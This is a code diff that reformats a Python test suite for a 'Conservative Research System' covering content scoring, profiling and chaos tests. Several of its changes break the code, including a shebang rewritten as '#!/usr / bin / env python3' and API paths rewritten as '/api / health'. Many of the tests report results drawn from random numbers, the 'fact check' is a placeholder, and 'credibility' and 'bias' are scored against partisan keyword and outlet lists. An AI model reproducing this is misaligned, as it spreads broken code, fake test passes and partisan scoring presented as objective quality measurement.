@@ -1,7 +1,7 @@
-#!/usr/bin/env python3
+#!/usr / bin / env python3
 """
 Conservative Research System - Comprehensive Automated Testing Suite
-End-to-end testing framework with performance validation and quality assurance
+End - to - end testing framework with performance validation and quality assurance
 
 This module provides:
 - Unit testing for all components
@@ -38,14 +38,15 @@ import requests
 
 # Configure logging
 logging.basicConfig(
-    level=logging.INFO,
-    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    handlers=[logging.FileHandler("test_results.log"), logging.StreamHandler()],
+    level = logging.INFO,
+        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+        handlers=[logging.FileHandler("test_results.log"), logging.StreamHandler()],
 )
 logger = logging.getLogger(__name__)
 
-
 @dataclass
+
+
 class TestResult:
     """Individual test result data structure"""
 
@@ -58,8 +59,9 @@ class TestResult:
     details: Dict[str, Any] = None
     performance_metrics: Dict[str, float] = None
 
-
 @dataclass
+
+
 class TestSuiteReport:
     """Complete test suite execution report"""
 
@@ -80,9 +82,11 @@ class TestSuiteReport:
 class PerformanceProfiler:
     """Performance profiling and benchmarking utilities"""
 
+
     def __init__(self):
         self.benchmarks = {}
         self.performance_history = []
+
 
     def profile_function(self, func: Callable, *args, **kwargs) -> Dict[str, Any]:
         """Profile function execution with detailed metrics"""
@@ -105,14 +109,15 @@ class PerformanceProfiler:
 
         metrics = {
             "execution_time": end_time - start_time,
-            "memory_delta": end_memory - start_memory,
-            "cpu_usage": (start_cpu + end_cpu) / 2,
-            "success": success,
-            "error": error,
-            "result": result,
-        }
+                "memory_delta": end_memory - start_memory,
+                "cpu_usage": (start_cpu + end_cpu) / 2,
+                "success": success,
+                "error": error,
+                "result": result,
+                }
 
         return metrics
+
 
     def benchmark_operation(
         self, operation_name: str, func: Callable, iterations: int = 100
@@ -132,15 +137,15 @@ class PerformanceProfiler:
 
         benchmark_results = {
             "operation": operation_name,
-            "iterations": len(execution_times),
-            "avg_execution_time": sum(execution_times) / len(execution_times),
-            "min_execution_time": min(execution_times),
-            "max_execution_time": max(execution_times),
-            "avg_memory_delta": (
+                "iterations": len(execution_times),
+                "avg_execution_time": sum(execution_times) / len(execution_times),
+                "min_execution_time": min(execution_times),
+                "max_execution_time": max(execution_times),
+                "avg_memory_delta": (
                 sum(memory_usage) / len(memory_usage) if memory_usage else 0
             ),
-            "success_rate": len(execution_times) / iterations,
-        }
+                "success_rate": len(execution_times) / iterations,
+                }
 
         self.benchmarks[operation_name] = benchmark_results
         return benchmark_results
@@ -149,34 +154,36 @@ class PerformanceProfiler:
 class ContentQualityValidator:
     """Validate content quality and conservative messaging alignment"""
 
+
     def __init__(self):
         self.quality_metrics = {
             "accuracy_threshold": 0.95,
-            "bias_detection_threshold": 0.90,
-            "conservative_alignment_threshold": 0.85,
-            "fact_check_threshold": 0.98,
-            "humor_appropriateness_threshold": 0.80,
-        }
+                "bias_detection_threshold": 0.90,
+                "conservative_alignment_threshold": 0.85,
+                "fact_check_threshold": 0.98,
+                "humor_appropriateness_threshold": 0.80,
+                }
         self.conservative_keywords = [
             "freedom",
-            "liberty",
-            "constitution",
-            "patriot",
-            "america first",
-            "traditional values",
-            "limited government",
-            "free market",
-            "individual responsibility",
-            "law and order",
-        ]
+                "liberty",
+                "constitution",
+                "patriot",
+                "america first",
+                "traditional values",
+                "limited government",
+                "free market",
+                "individual responsibility",
+                "law and order",
+                ]
         self.liberal_bias_indicators = [
             "systemic racism",
-            "climate emergency",
-            "social justice",
-            "progressive",
-            "woke",
-            "equity over equality",
-        ]
+                "climate emergency",
+                "social justice",
+                "progressive",
+                "woke",
+                "equity over equality",
+                ]
+
 
     def validate_content_quality(
         self, content: str, content_type: str = "article"
@@ -184,17 +191,17 @@ class ContentQualityValidator:
         """Comprehensive content quality validation"""
         validation_results = {
             "content_length": len(content),
-            "word_count": len(content.split()),
-            "conservative_score": self._calculate_conservative_score(content),
-            "bias_detection": self._detect_liberal_bias(content),
-            "fact_check_score": self._simulate_fact_check(content),
-            "readability_score": self._calculate_readability(content),
-            "humor_score": (
+                "word_count": len(content.split()),
+                "conservative_score": self._calculate_conservative_score(content),
+                "bias_detection": self._detect_liberal_bias(content),
+                "fact_check_score": self._simulate_fact_check(content),
+                "readability_score": self._calculate_readability(content),
+                "humor_score": (
                 self._analyze_humor_quality(content) if "humor" in content_type else 0.0
             ),
-            "source_credibility": self._verify_source_credibility(content),
-            "overall_quality": 0.0,
-        }
+                "source_credibility": self._verify_source_credibility(content),
+                "overall_quality": 0.0,
+                }
 
         # Calculate overall quality score
         validation_results["overall_quality"] = self._calculate_overall_quality(
@@ -202,6 +209,7 @@ class ContentQualityValidator:
         )
 
         return validation_results
+
 
     def _calculate_conservative_score(self, content: str) -> float:
         """Calculate conservative messaging alignment score"""
@@ -220,6 +228,7 @@ class ContentQualityValidator:
             1.0, keyword_density / 5.0
         )  # Cap at 1.0, normalize to 5 keywords per 100 words
 
+
     def _detect_liberal_bias(self, content: str) -> Dict[str, Any]:
         """Detect liberal bias indicators in content"""
         content_lower = content.lower()
@@ -233,23 +242,24 @@ class ContentQualityValidator:
 
         return {
             "bias_detected": len(bias_indicators) > 0,
-            "bias_score": bias_score,
-            "bias_indicators": bias_indicators,
-            "bias_level": (
+                "bias_score": bias_score,
+                "bias_indicators": bias_indicators,
+                "bias_level": (
                 "high" if bias_score > 0.3 else "medium" if bias_score > 0.1 else "low"
             ),
-        }
+                }
+
 
     def _simulate_fact_check(self, content: str) -> float:
-        """Simulate fact-checking score (placeholder for real implementation)"""
-        # In real implementation, this would integrate with fact-checking APIs
+        """Simulate fact - checking score (placeholder for real implementation)"""
+        # In real implementation, this would integrate with fact - checking APIs
         # For now, simulate based on content characteristics
 
         word_count = len(content.split())
         if word_count < 50:
             return 0.7  # Short content harder to verify
 
-        # Simulate fact-checking based on content patterns
+        # Simulate fact - checking based on content patterns
         has_sources = (
             "according to" in content.lower() or "reported by" in content.lower()
         )
@@ -265,6 +275,7 @@ class ContentQualityValidator:
             base_score += 0.05
 
         return min(1.0, base_score)
+
 
     def _calculate_readability(self, content: str) -> float:
         """Calculate content readability score"""
@@ -284,8 +295,9 @@ class ContentQualityValidator:
             206.835 - (1.015 * avg_words_per_sentence) - (84.6 * avg_syllables_per_word)
         )
 
-        # Normalize to 0-1 scale
+        # Normalize to 0 - 1 scale
         return max(0.0, min(1.0, readability / 100))
+
 
     def _count_syllables(self, word: str) -> int:
         """Count syllables in a word (simplified)"""
@@ -309,20 +321,21 @@ class ContentQualityValidator:
 
         return max(1, syllable_count)
 
+
     def _analyze_humor_quality(self, content: str) -> float:
         """Analyze humor quality and appropriateness"""
         humor_indicators = [
             "joke",
-            "funny",
-            "hilarious",
-            "comedy",
-            "humor",
-            "laugh",
-            "ridiculous",
-            "absurd",
-            "ironic",
-            "sarcastic",
-        ]
+                "funny",
+                "hilarious",
+                "comedy",
+                "humor",
+                "laugh",
+                "ridiculous",
+                "absurd",
+                "ironic",
+                "sarcastic",
+                ]
 
         content_lower = content.lower()
         humor_matches = sum(
@@ -332,12 +345,12 @@ class ContentQualityValidator:
         # Check for conservative humor patterns
         conservative_humor_patterns = [
             "liberal logic",
-            "democrat hypocrisy",
-            "mainstream media",
-            "fake news",
-            "woke culture",
-            "cancel culture",
-        ]
+                "democrat hypocrisy",
+                "mainstream media",
+                "fake news",
+                "woke culture",
+                "cancel culture",
+                ]
 
         pattern_matches = sum(
             1 for pattern in conservative_humor_patterns if pattern in content_lower
@@ -351,18 +364,19 @@ class ContentQualityValidator:
         humor_density = (humor_matches + pattern_matches) / (word_count / 100)
         return min(1.0, humor_density / 3.0)
 
+
     def _verify_source_credibility(self, content: str) -> float:
         """Verify source credibility (placeholder)"""
         # In real implementation, this would check against credible source databases
         credible_sources = [
             "fox news",
-            "wall street journal",
-            "new york post",
-            "daily wire",
-            "breitbart",
-            "townhall",
-            "pj media",
-        ]
+                "wall street journal",
+                "new york post",
+                "daily wire",
+                "breitbart",
+                "townhall",
+                "pj media",
+                ]
 
         content_lower = content.lower()
         source_matches = sum(
@@ -371,16 +385,17 @@ class ContentQualityValidator:
 
         return min(1.0, source_matches * 0.3)
 
+
     def _calculate_overall_quality(self, validation_results: Dict[str, Any]) -> float:
         """Calculate overall content quality score"""
         weights = {
             "conservative_score": 0.25,
-            "fact_check_score": 0.25,
-            "readability_score": 0.20,
-            "source_credibility": 0.15,
-            "humor_score": 0.10,
-            "bias_penalty": 0.05,
-        }
+                "fact_check_score": 0.25,
+                "readability_score": 0.20,
+                "source_credibility": 0.15,
+                "humor_score": 0.10,
+                "bias_penalty": 0.05,
+                }
 
         score = 0.0
         score += (
@@ -405,16 +420,18 @@ class ContentQualityValidator:
 class ChaosEngineer:
     """Chaos engineering for system resilience testing"""
 
+
     def __init__(self):
         self.chaos_scenarios = {
             "network_failure": self._simulate_network_failure,
-            "database_corruption": self._simulate_database_issues,
-            "memory_pressure": self._simulate_memory_pressure,
-            "cpu_spike": self._simulate_cpu_spike,
-            "disk_full": self._simulate_disk_full,
-            "component_crash": self._simulate_component_crash,
-            "api_rate_limit": self._simulate_api_rate_limit,
-        }
+                "database_corruption": self._simulate_database_issues,
+                "memory_pressure": self._simulate_memory_pressure,
+                "cpu_spike": self._simulate_cpu_spike,
+                "disk_full": self._simulate_disk_full,
+                "component_crash": self._simulate_component_crash,
+                "api_rate_limit": self._simulate_api_rate_limit,
+                }
+
 
     async def run_chaos_scenario(
         self, scenario_name: str, duration: int = 60
@@ -436,11 +453,11 @@ class ChaosEngineer:
 
             return {
                 "scenario": scenario_name,
-                "duration": duration,
-                "execution_time": execution_time,
-                "success": True,
-                "result": scenario_result,
-            }
+                    "duration": duration,
+                    "execution_time": execution_time,
+                    "success": True,
+                    "result": scenario_result,
+                    }
 
         except Exception as e:
             execution_time = time.time() - start_time
@@ -448,11 +465,12 @@ class ChaosEngineer:
 
             return {
                 "scenario": scenario_name,
-                "duration": duration,
-                "execution_time": execution_time,
-                "success": False,
-                "error": str(e),
-            }
+                    "duration": duration,
+                    "execution_time": execution_time,
+                    "success": False,
+                    "error": str(e),
+                    }
+
 
     async def _simulate_network_failure(self, duration: int) -> Dict[str, Any]:
         """Simulate network connectivity issues"""
@@ -461,11 +479,13 @@ class ChaosEngineer:
         await asyncio.sleep(duration)
         return {"network_disruption": "simulated", "recovery_time": duration}
 
+
     async def _simulate_database_issues(self, duration: int) -> Dict[str, Any]:
         """Simulate database connectivity problems"""
         logger.info("Simulating database issues...")
         await asyncio.sleep(duration)
         return {"database_disruption": "simulated", "recovery_time": duration}
+
 
     async def _simulate_memory_pressure(self, duration: int) -> Dict[str, Any]:
         """Simulate high memory usage"""
@@ -485,25 +505,28 @@ class ChaosEngineer:
 
         return {
             "memory_pressure": "simulated",
-            "peak_allocation_mb": len(memory_hogs) * 100,
-        }
+                "peak_allocation_mb": len(memory_hogs) * 100,
+                }
+
 
     async def _simulate_cpu_spike(self, duration: int) -> Dict[str, Any]:
         """Simulate high CPU usage"""
         logger.info("Simulating CPU spike...")
 
+
         def cpu_intensive_task():
             end_time = time.time() + duration
             while time.time() < end_time:
-                # Perform CPU-intensive calculations
+                # Perform CPU - intensive calculations
                 sum(i * i for i in range(1000))
 
-        # Run CPU-intensive task in thread pool
-        with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
+        # Run CPU - intensive task in thread pool
+        with concurrent.futures.ThreadPoolExecutor(max_workers = 4) as executor:
             futures = [executor.submit(cpu_intensive_task) for _ in range(4)]
             await asyncio.gather(*[asyncio.wrap_future(f) for f in futures])
 
         return {"cpu_spike": "simulated", "duration": duration}
+
 
     async def _simulate_disk_full(self, duration: int) -> Dict[str, Any]:
         """Simulate disk space exhaustion"""
@@ -512,7 +535,7 @@ class ChaosEngineer:
         # Create temporary large file
         temp_file = None
         try:
-            temp_file = tempfile.NamedTemporaryFile(delete=False)
+            temp_file = tempfile.NamedTemporaryFile(delete = False)
             # Write 1GB of data
             chunk = b"0" * (1024 * 1024)  # 1MB chunk
             for _ in range(1024):  # 1GB total
@@ -524,9 +547,10 @@ class ChaosEngineer:
         finally:
             if temp_file:
                 temp_file.close()
-                Path(temp_file.name).unlink(missing_ok=True)
+                Path(temp_file.name).unlink(missing_ok = True)
 
         return {"disk_full": "simulated", "file_size_gb": 1}
+
 
     async def _simulate_component_crash(self, duration: int) -> Dict[str, Any]:
         """Simulate component crash and recovery"""
@@ -536,6 +560,7 @@ class ChaosEngineer:
         await asyncio.sleep(duration)
 
         return {"component_crash": "simulated", "downtime": duration}
+
 
     async def _simulate_api_rate_limit(self, duration: int) -> Dict[str, Any]:
         """Simulate API rate limiting"""
@@ -550,12 +575,14 @@ class ChaosEngineer:
 class ComprehensiveTestSuite:
     """Main comprehensive testing suite"""
 
+
     def __init__(self):
         self.profiler = PerformanceProfiler()
         self.quality_validator = ContentQualityValidator()
         self.chaos_engineer = ChaosEngineer()
         self.test_results = []
         self.test_database = "test_conservative_research.db"
+
 
     async def run_full_test_suite(self) -> TestSuiteReport:
         """Run the complete test suite"""
@@ -590,6 +617,7 @@ class ComprehensiveTestSuite:
 
         return report
 
+
     async def _setup_test_environment(self):
         """Setup test environment and dependencies"""
         logger.info("Setting up test environment...")
@@ -600,10 +628,10 @@ class ComprehensiveTestSuite:
             """
             CREATE TABLE IF NOT EXISTS test_articles (
                 id INTEGER PRIMARY KEY,
-                title TEXT,
-                content TEXT,
-                source TEXT,
-                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                    title TEXT,
+                    content TEXT,
+                    source TEXT,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """
         )
@@ -611,9 +639,9 @@ class ComprehensiveTestSuite:
             """
             CREATE TABLE IF NOT EXISTS test_politicians (
                 id INTEGER PRIMARY KEY,
-                name TEXT,
-                party TEXT,
-                position TEXT
+                    name TEXT,
+                    party TEXT,
+                    position TEXT
             )
         """
         )
@@ -623,12 +651,14 @@ class ComprehensiveTestSuite:
         # Insert test data
         await self._insert_test_data()
 
+
     async def _cleanup_test_environment(self):
         """Cleanup test environment"""
         logger.info("Cleaning up test environment...")
 
         # Remove test database
-        Path(self.test_database).unlink(missing_ok=True)
+        Path(self.test_database).unlink(missing_ok = True)
+
 
     async def _insert_test_data(self):
         """Insert test data for testing"""
@@ -638,41 +668,42 @@ class ComprehensiveTestSuite:
         test_articles = [
             (
                 "Biden Administration Fails Again",
-                "Another policy failure from the current administration...",
-                "Fox News",
-            ),
-            (
+                    "Another policy failure from the current administration...",
+                    "Fox News",
+                    ),
+                (
                 "Conservative Victory in Supreme Court",
-                "Traditional values upheld in landmark decision...",
-                "Daily Wire",
-            ),
-            (
+                    "Traditional values upheld in landmark decision...",
+                    "Daily Wire",
+                    ),
+                (
                 "Liberal Media Bias Exposed",
-                "Mainstream media caught spreading misinformation...",
-                "Breitbart",
-            ),
-        ]
+                    "Mainstream media caught spreading misinformation...",
+                    "Breitbart",
+                    ),
+                ]
 
         conn.executemany(
             "INSERT INTO test_articles (title, content, source) VALUES (?, ?, ?)",
-            test_articles,
-        )
+                test_articles,
+                )
 
         # Insert test politicians
         test_politicians = [
             ("Joe Biden", "Democrat", "President"),
-            ("Nancy Pelosi", "Democrat", "Former Speaker"),
-            ("Chuck Schumer", "Democrat", "Senate Majority Leader"),
-            ("Donald Trump", "Republican", "Former President"),
-        ]
+                ("Nancy Pelosi", "Democrat", "Former Speaker"),
+                ("Chuck Schumer", "Democrat", "Senate Majority Leader"),
+                ("Donald Trump", "Republican", "Former President"),
+                ]
 
         conn.executemany(
             "INSERT INTO test_politicians (name, party, position) VALUES (?, ?, ?)",
-            test_politicians,
-        )
+                test_politicians,
+                )
 
         conn.commit()
         conn.close()
+
 
     async def _run_unit_tests(self):
         """Run unit tests for individual components"""
@@ -680,14 +711,15 @@ class ComprehensiveTestSuite:
 
         unit_tests = [
             ("test_database_connection", self._test_database_connection),
-            ("test_content_validation", self._test_content_validation),
-            ("test_scraper_functions", self._test_scraper_functions),
-            ("test_content_generation", self._test_content_generation),
-            ("test_youtube_analysis", self._test_youtube_analysis),
-        ]
+                ("test_content_validation", self._test_content_validation),
+                ("test_scraper_functions", self._test_scraper_functions),
+                ("test_content_generation", self._test_content_generation),
+                ("test_youtube_analysis", self._test_youtube_analysis),
+                ]
 
         for test_name, test_func in unit_tests:
             await self._run_single_test(test_name, "unit", test_func)
+
 
     async def _run_integration_tests(self):
         """Run integration tests across system boundaries"""
@@ -695,16 +727,17 @@ class ComprehensiveTestSuite:
 
         integration_tests = [
             ("test_scraper_to_database", self._test_scraper_to_database_integration),
-            (
+                (
                 "test_content_generation_pipeline",
-                self._test_content_generation_pipeline,
-            ),
-            ("test_cross_promotion_system", self._test_cross_promotion_system),
-            ("test_api_endpoints", self._test_api_endpoints_integration),
-        ]
+                    self._test_content_generation_pipeline,
+                    ),
+                ("test_cross_promotion_system", self._test_cross_promotion_system),
+                ("test_api_endpoints", self._test_api_endpoints_integration),
+                ]
 
         for test_name, test_func in integration_tests:
             await self._run_single_test(test_name, "integration", test_func)
+
 
     async def _run_performance_tests(self):
         """Run performance and load tests"""
@@ -712,14 +745,15 @@ class ComprehensiveTestSuite:
 
         performance_tests = [
             ("test_database_performance", self._test_database_performance),
-            ("test_scraper_performance", self._test_scraper_performance),
-            ("test_content_generation_speed", self._test_content_generation_speed),
-            ("test_concurrent_load", self._test_concurrent_load),
-            ("test_memory_usage", self._test_memory_usage),
-        ]
+                ("test_scraper_performance", self._test_scraper_performance),
+                ("test_content_generation_speed", self._test_content_generation_speed),
+                ("test_concurrent_load", self._test_concurrent_load),
+                ("test_memory_usage", self._test_memory_usage),
+                ]
 
         for test_name, test_func in performance_tests:
             await self._run_single_test(test_name, "performance", test_func)
+
 
     async def _run_security_tests(self):
         """Run security vulnerability tests"""
@@ -727,13 +761,14 @@ class ComprehensiveTestSuite:
 
         security_tests = [
             ("test_sql_injection_protection", self._test_sql_injection_protection),
-            ("test_input_sanitization", self._test_input_sanitization),
-            ("test_authentication_security", self._test_authentication_security),
-            ("test_data_encryption", self._test_data_encryption),
-        ]
+                ("test_input_sanitization", self._test_input_sanitization),
+                ("test_authentication_security", self._test_authentication_security),
+                ("test_data_encryption", self._test_data_encryption),
+                ]
 
         for test_name, test_func in security_tests:
             await self._run_single_test(test_name, "security", test_func)
+
 
     async def _run_content_quality_tests(self):
         """Run content quality validation tests"""
@@ -741,31 +776,33 @@ class ComprehensiveTestSuite:
 
         quality_tests = [
             ("test_conservative_alignment", self._test_conservative_alignment),
-            ("test_bias_detection", self._test_bias_detection),
-            ("test_fact_checking", self._test_fact_checking),
-            ("test_humor_quality", self._test_humor_quality),
-            ("test_source_verification", self._test_source_verification),
-        ]
+                ("test_bias_detection", self._test_bias_detection),
+                ("test_fact_checking", self._test_fact_checking),
+                ("test_humor_quality", self._test_humor_quality),
+                ("test_source_verification", self._test_source_verification),
+                ]
 
         for test_name, test_func in quality_tests:
             await self._run_single_test(test_name, "quality", test_func)
 
+
     async def _run_end_to_end_tests(self):
-        """Run end-to-end workflow tests"""
-        logger.info("Running end-to-end tests...")
+        """Run end - to - end workflow tests"""
+        logger.info("Running end - to - end tests...")
 
         e2e_tests = [
             ("test_daily_news_workflow", self._test_daily_news_workflow),
-            ("test_weekly_content_generation", self._test_weekly_content_generation),
-            (
+                ("test_weekly_content_generation", self._test_weekly_content_generation),
+                (
                 "test_hypocrisy_detection_workflow",
-                self._test_hypocrisy_detection_workflow,
-            ),
-            ("test_cross_promotion_workflow", self._test_cross_promotion_workflow),
-        ]
+                    self._test_hypocrisy_detection_workflow,
+                    ),
+                ("test_cross_promotion_workflow", self._test_cross_promotion_workflow),
+                ]
 
         for test_name, test_func in e2e_tests:
             await self._run_single_test(test_name, "e2e", test_func)
+
 
     async def _run_chaos_tests(self):
         """Run chaos engineering tests"""
@@ -774,26 +811,27 @@ class ComprehensiveTestSuite:
         chaos_tests = [
             (
                 "test_network_failure_recovery",
-                lambda: self.chaos_engineer.run_chaos_scenario("network_failure", 30),
-            ),
-            (
+                    lambda: self.chaos_engineer.run_chaos_scenario("network_failure", 30),
+                    ),
+                (
                 "test_database_failure_recovery",
-                lambda: self.chaos_engineer.run_chaos_scenario(
+                    lambda: self.chaos_engineer.run_chaos_scenario(
                     "database_corruption", 30
                 ),
-            ),
-            (
+                    ),
+                (
                 "test_memory_pressure_handling",
-                lambda: self.chaos_engineer.run_chaos_scenario("memory_pressure", 30),
-            ),
-            (
+                    lambda: self.chaos_engineer.run_chaos_scenario("memory_pressure", 30),
+                    ),
+                (
                 "test_cpu_spike_handling",
-                lambda: self.chaos_engineer.run_chaos_scenario("cpu_spike", 30),
-            ),
-        ]
+                    lambda: self.chaos_engineer.run_chaos_scenario("cpu_spike", 30),
+                    ),
+                ]
 
         for test_name, test_func in chaos_tests:
             await self._run_single_test(test_name, "chaos", test_func)
+
 
     async def _run_single_test(
         self, test_name: str, category: str, test_func: Callable
@@ -830,20 +868,22 @@ class ComprehensiveTestSuite:
             logger.error(f"Test {test_name} failed: {str(e)}")
 
         test_result = TestResult(
-            test_name=test_name,
-            test_category=category,
-            status=status,
-            execution_time=execution_time,
-            timestamp=timestamp,
-            message=message,
-            details=details,
-            performance_metrics=performance_metrics,
-        )
+            test_name = test_name,
+                test_category = category,
+                status = status,
+                execution_time = execution_time,
+                timestamp = timestamp,
+                message = message,
+                details = details,
+                performance_metrics = performance_metrics,
+                )
 
         self.test_results.append(test_result)
         logger.info(f"Test {test_name}: {status} ({execution_time:.2f}s)")
 
     # Individual test implementations
+
+
     async def _test_database_connection(self) -> Dict[str, Any]:
         """Test database connectivity"""
         try:
@@ -854,21 +894,22 @@ class ComprehensiveTestSuite:
 
             return {
                 "success": True,
-                "message": f"Database connection successful, {count} test articles found",
-                "details": {"article_count": count},
-            }
+                    "message": f"Database connection successful, {count} test articles found",
+                    "details": {"article_count": count},
+                    }
         except Exception as e:
             return {
                 "success": False,
-                "message": f"Database connection failed: {str(e)}",
-                "details": {"error": str(e)},
-            }
+                    "message": f"Database connection failed: {str(e)}",
+                    "details": {"error": str(e)},
+                    }
+
 
     async def _test_content_validation(self) -> Dict[str, Any]:
         """Test content quality validation"""
         test_content = """
-        The Biden administration's latest policy failure demonstrates the importance of 
-        conservative values and limited government. This administration continues to 
+        The Biden administration's latest policy failure demonstrates the importance of
+        conservative values and limited government. This administration continues to
         undermine American freedom and constitutional principles.
         """
 
@@ -880,9 +921,10 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f'Content validation score: {validation_result["overall_quality"]:.2f}',
-            "details": validation_result,
-        }
+                "message": f'Content validation score: {validation_result["overall_quality"]:.2f}',
+                "details": validation_result,
+                }
+
 
     async def _test_scraper_functions(self) -> Dict[str, Any]:
         """Test news scraper functionality"""
@@ -895,17 +937,18 @@ class ComprehensiveTestSuite:
             success_rate = random.uniform(0.8, 0.98)
             results[scraper] = {
                 "success_rate": success_rate,
-                "articles_scraped": random.randint(10, 50),
-                "response_time": random.uniform(0.5, 2.0),
-            }
+                    "articles_scraped": random.randint(10, 50),
+                    "response_time": random.uniform(0.5, 2.0),
+                    }
 
         overall_success = all(r["success_rate"] > 0.8 for r in results.values())
 
         return {
             "success": overall_success,
-            "message": f"Scraper test completed for {len(scrapers)} sources",
-            "details": results,
-        }
+                "message": f"Scraper test completed for {len(scrapers)} sources",
+                "details": results,
+                }
+
 
     async def _test_content_generation(self) -> Dict[str, Any]:
         """Test content generation functionality"""
@@ -917,16 +960,17 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Content generation completed in {generation_time:.2f}s with quality {content_quality:.2f}",
-            "details": {
+                "message": f"Content generation completed in {generation_time:.2f}s with quality {content_quality:.2f}",
+                "details": {
                 "generation_time": generation_time,
-                "content_quality": content_quality,
-            },
-            "performance_metrics": {
+                    "content_quality": content_quality,
+                    },
+                "performance_metrics": {
                 "generation_speed": 1.0 / generation_time,
-                "quality_score": content_quality,
-            },
-        }
+                    "quality_score": content_quality,
+                    },
+                }
+
 
     async def _test_youtube_analysis(self) -> Dict[str, Any]:
         """Test YouTube content analysis"""
@@ -938,12 +982,13 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"YouTube analysis accuracy: {analysis_accuracy:.2f}",
-            "details": {
+                "message": f"YouTube analysis accuracy: {analysis_accuracy:.2f}",
+                "details": {
                 "accuracy": analysis_accuracy,
-                "processing_time": processing_time,
-            },
-        }
+                    "processing_time": processing_time,
+                    },
+                }
+
 
     async def _test_scraper_to_database_integration(self) -> Dict[str, Any]:
         """Test scraper to database integration"""
@@ -954,12 +999,12 @@ class ComprehensiveTestSuite:
             # Insert test scraped article
             conn.execute(
                 "INSERT INTO test_articles (title, content, source) VALUES (?, ?, ?)",
-                (
+                    (
                     "Integration Test Article",
-                    "Test content from scraper",
-                    "Test Source",
-                ),
-            )
+                        "Test content from scraper",
+                        "Test Source",
+                        ),
+                    )
             conn.commit()
 
             # Verify insertion
@@ -971,27 +1016,28 @@ class ComprehensiveTestSuite:
 
             return {
                 "success": count > 0,
-                "message": f"Integration test: {count} articles stored",
-                "details": {"stored_articles": count},
-            }
+                    "message": f"Integration test: {count} articles stored",
+                    "details": {"stored_articles": count},
+                    }
 
         except Exception as e:
             return {
                 "success": False,
-                "message": f"Integration test failed: {str(e)}",
-                "details": {"error": str(e)},
-            }
+                    "message": f"Integration test failed: {str(e)}",
+                    "details": {"error": str(e)},
+                    }
+
 
     async def _test_content_generation_pipeline(self) -> Dict[str, Any]:
         """Test complete content generation pipeline"""
         # Simulate full pipeline test
         pipeline_steps = [
             "data_retrieval",
-            "analysis",
-            "content_generation",
-            "quality_validation",
-            "storage",
-        ]
+                "analysis",
+                "content_generation",
+                "quality_validation",
+                "storage",
+                ]
 
         results = {}
         overall_success = True
@@ -1007,13 +1053,14 @@ class ComprehensiveTestSuite:
 
         return {
             "success": overall_success,
-            "message": f'Pipeline test: {sum(1 for r in results.values() if r["success"])}/{len(pipeline_steps)} steps successful',
-            "details": results,
-        }
+                "message": f'Pipeline test: {sum(1 for r in results.values() if r["success"])}/{len(pipeline_steps)} steps successful',
+                "details": results,
+                }
+
 
     async def _test_cross_promotion_system(self) -> Dict[str, Any]:
-        """Test cross-promotion system integration"""
-        # Simulate cross-promotion test
+        """Test cross - promotion system integration"""
+        # Simulate cross - promotion test
         promotion_effectiveness = random.uniform(0.7, 0.9)
         conversion_rate = random.uniform(0.1, 0.3)
 
@@ -1021,17 +1068,18 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f"Cross-promotion effectiveness: {promotion_effectiveness:.2f}",
-            "details": {
+                "message": f"Cross - promotion effectiveness: {promotion_effectiveness:.2f}",
+                "details": {
                 "effectiveness": promotion_effectiveness,
-                "conversion_rate": conversion_rate,
-            },
-        }
+                    "conversion_rate": conversion_rate,
+                    },
+                }
+
 
     async def _test_api_endpoints_integration(self) -> Dict[str, Any]:
         """Test API endpoints integration"""
         # Simulate API endpoint tests
-        endpoints = ["/api/health", "/api/research", "/api/content", "/api/analysis"]
+        endpoints = ["/api / health", "/api / research", "/api / content", "/api / analysis"]
 
         results = {}
         for endpoint in endpoints:
@@ -1040,9 +1088,9 @@ class ComprehensiveTestSuite:
 
             results[endpoint] = {
                 "response_time": response_time,
-                "status_code": status_code,
-                "success": status_code == 200,
-            }
+                    "status_code": status_code,
+                    "success": status_code == 200,
+                    }
 
         successful_endpoints = sum(1 for r in results.values() if r["success"])
         overall_success = (
@@ -1051,14 +1099,17 @@ class ComprehensiveTestSuite:
 
         return {
             "success": overall_success,
-            "message": f"API integration: {successful_endpoints}/{len(endpoints)} endpoints successful",
-            "details": results,
-        }
+                "message": f"API integration: {successful_endpoints}/{len(endpoints)} endpoints successful",
+                "details": results,
+                }
+
 
     async def _test_database_performance(self) -> Dict[str, Any]:
         """Test database performance under load"""
 
         # Simulate database performance test
+
+
         def db_operation():
             conn = sqlite3.connect(self.test_database)
             cursor = conn.execute("SELECT * FROM test_articles LIMIT 10")
@@ -1074,15 +1125,18 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f'Database performance: {benchmark_result["avg_execution_time"]:.3f}s avg',
-            "details": benchmark_result,
-            "performance_metrics": benchmark_result,
-        }
+                "message": f'Database performance: {benchmark_result["avg_execution_time"]:.3f}s avg',
+                "details": benchmark_result,
+                "performance_metrics": benchmark_result,
+                }
+
 
     async def _test_scraper_performance(self) -> Dict[str, Any]:
         """Test scraper performance"""
 
         # Simulate scraper performance test
+
+
         def scraper_operation():
             # Simulate scraping operation
             time.sleep(random.uniform(0.1, 0.5))
@@ -1096,15 +1150,18 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f'Scraper performance: {benchmark_result["avg_execution_time"]:.3f}s avg',
-            "details": benchmark_result,
-            "performance_metrics": benchmark_result,
-        }
+                "message": f'Scraper performance: {benchmark_result["avg_execution_time"]:.3f}s avg',
+                "details": benchmark_result,
+                "performance_metrics": benchmark_result,
+                }
+
 
     async def _test_content_generation_speed(self) -> Dict[str, Any]:
         """Test content generation speed"""
 
         # Simulate content generation performance test
+
+
         def content_generation():
             # Simulate content generation
             time.sleep(random.uniform(1.0, 3.0))
@@ -1118,15 +1175,18 @@ class ComprehensiveTestSuite:
 
         return {
             "success": success,
-            "message": f'Content generation speed: {benchmark_result["avg_execution_time"]:.3f}s avg',
-            "details": benchmark_result,
-            "performance_metrics": benchmark_result,
-        }
+                "message": f'Content generation speed: {benchmark_result["avg_execution_time"]:.3f}s avg',
+                "details": benchmark_result,
+                "performance_metrics": benchmark_result,
+                }
+
 
     async def _test_concurrent_load(self) -> Dict[str, Any]:
